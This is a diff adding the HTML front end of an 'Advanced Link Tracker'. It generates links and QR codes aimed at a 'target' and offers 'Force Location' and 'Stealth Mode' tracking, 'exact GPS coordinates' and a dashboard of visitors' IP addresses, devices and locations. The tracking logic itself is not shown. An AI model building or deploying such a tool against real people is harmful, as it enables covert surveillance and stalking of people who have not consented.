@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Link Tracker</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Advanced Link Tracker <span class="version-badge">v50</span></h1>
+        
+        <div id="creator-section">
+            <div class="form-group">
+                <label for="target-url">Destination URL</label>
+                <input type="url" id="target-url" placeholder="https://example.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="campaign-name">Campaign Name (Optional)</label>
+                <input type="text" id="campaign-name" placeholder="e.g. Summer Sale">
+            </div>
+            
+            <div class="form-group">
+                <label for="custom-message">Custom Message (Optional)</label>
+                <textarea id="custom-message" placeholder="Enter a custom message that will be shown to the target..."></textarea>
+            </div>
+            
+            <div class="form-group">
+                <label for="security-level">Security Level</label>
+                <select id="security-level">
+                    <option value="standard">Standard Tracking</option>
+                    <option value="enhanced">Enhanced Tracking (Force Location)</option>
+                    <option value="stealth">Stealth Mode (Delayed Tracking)</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label>Link Expiration</label>
+                <div class="expiry-options">
+                    <div class="expiry-option selected" data-days="0">No expiration</div>
+                    <div class="expiry-option" data-days="1">1 day</div>
+                    <div class="expiry-option" data-days="7">7 days</div>
+                    <div class="expiry-option" data-days="30">30 days</div>
+                    <div class="expiry-option" data-days="custom">Custom</div>
+                </div>
+                <input type="number" id="custom-expiry-days" class="hidden" placeholder="Enter number of days" style="margin-top: 0.5rem;">
+            </div>
+            
+            <button id="generate-btn" class="btn btn-block">Generate Tracking Link</button>
+            
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">📍</div>
+                    <div class="feature-title">Precise Location</div>
+                    <div class="feature-desc">Get exact GPS coordinates of the target</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🛡️</div>
+                    <div class="feature-title">Anti-DDoS</div>
+                    <div class="feature-desc">Advanced protection against attacks</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🤖</div>
+                    <div class="feature-title">AI Detection</div>
+                    <div class="feature-desc">Identify bots and fake users</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🚀</div>
+                    <div class="feature-title">No Lag</div>
+                    <div class="feature-desc">Optimized for maximum performance</div>
+                </div>
+            </div>
+            
+            <div class="security-badge">Military Grade Encryption</div>
+            
+            <div class="result-container" id="result-container">
+                <div class="result-title">Your Tracking Link is Ready</div>
+                <div class="tracking-link" id="tracking-link">
+                    <button class="copy-btn" id="copy-btn">Copy</button>
+                    <span id="link-text"></span>
+                </div>
+                
+                <div class="qr-code-container">
+                    <div id="qr-code"></div>
+                    <button class="download-btn" id="download-qr">Download QR Code</button>
+                </div>
+                
+                <div class="result-title">Monitoring Dashboard</div>
+                <div id="dashboard-link" class="tracking-link">
+                    <button class="copy-btn" id="copy-dashboard-btn">Copy</button>
+                    <span id="dashboard-text"></span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="dashboard-container" id="dashboard-container">
+            <div class="tab-container">
+                <div class="tabs">
+                    <div class="tab active" data-tab="summary">Summary</div>
+                    <div class="tab" data-tab="visitors">Visitors</div>
+                    <div class="tab" data-tab="locations">Locations</div>
+                    <div class="tab" data-tab="devices">Devices</div>
+                    <div class="tab" data-tab="analysis">AI Analysis</div>
+                </div>
+            </div>
+            
+            <div class="tab-content active" data-tab="summary">
+                <div id="tracker-summary">
+                    <!-- Dynamic content will be loaded here -->
+                </div>
+            </div>
+            
+            <div class="tab-content" data-tab="visitors">
+                <div id="visitors-list">
+                    <table class="visitor-table">
+                        <thead>
+                            <tr>
+                                <th>Time</th>
+                                <th>Device</th>
+                                <th>Location</th>
+                                <th>IP Address</th>
+                                <th>Status</th>
+                            </tr>
+                        </thead>
+                        <tbody id="visitor-table-body">
+                            <!-- Dynamic content will be loaded here -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="tab-content" data-tab="locations">
+                <div class="map-container">
+                    <div class="map-placeholder">
+                        <div>
+                            <h3>Location Map</h3>
+                            <p>Visitor locations will be displayed here</p>
+                        </div>
+                    </div>
+                </div>
+                <div id="location-data">
+                    <!-- Dynamic content will be loaded here -->
+                </div>
+            </div>
+            
+            <div class="tab-content" data-tab="devices">
+                <div class="device-info">
+                    <h3>Device Information</h3>
+                    <p>Detailed information about visitor devices</p>
+                    
+                    <div id="device-info-content">
+                        <!-- Dynamic content will be loaded here -->
+                    </div>
+                </div>
+            </div>
+            
+            <div class="tab-content" data-tab="analysis">
+                <div class="ai-analysis">
+                    <h3>AI Threat Analysis</h3>
+                    <p>Our AI system analyzes each visitor for suspicious behavior</p>
+                    
+                    <div id="ai-analysis-results">
+                        <!-- Dynamic content will be loaded here -->
+                    </div>
+                </div>
+            </div>
+            
+            <button id="back-to-creator" class="btn btn-secondary">Back to Creator</button>
+        </div>
+    </div>
+
+    <div class="notification" id="notification">Copied to clipboard!</div>
+
+    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+    <script src="assets/js/app.js"></script>
+</body>
+</html>
